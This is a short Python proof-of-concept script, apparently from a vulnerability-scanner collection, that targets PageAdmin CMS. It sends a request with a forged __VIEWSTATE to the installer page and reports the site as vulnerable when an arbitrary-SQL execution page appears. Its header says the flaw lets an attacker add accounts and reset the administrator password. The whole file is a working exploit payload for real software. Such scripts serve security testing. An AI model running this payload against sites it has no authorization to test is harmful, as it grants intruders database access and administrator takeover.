#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: PageAdmin可“伪造”VIEWSTATE执行任意SQL查询&重置管理员密码
referer: http://www.wooyun.org/bugs/wooyun-2014-061699
author: Lucifer
description: 利用.NET的bug可以伪造viewstate登录到SQL执行页面,添加任意账户并重置管理员密码。
'''
import sys
import requests
import warnings
from termcolor import cprint

class pageadmin_forge_viewstate_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/e/install/index.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExODcwMDU5OTgPZBYCAgEPZBYCAgMPFgIeB1Zpc2libGVoZGQ%3D&ctl02=%E8%BF%90%E8%A1%8CSQL"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"WebForm_DoPostBackWithOptions" in req.text and r"Tb_sql" in req.text:
                cprint("[+]存在PageAdmin可“伪造”VIEWSTATE执行任意SQL查询&重置管理员密码漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = pageadmin_forge_viewstate_BaseVerify(sys.argv[1])
    testVuln.run()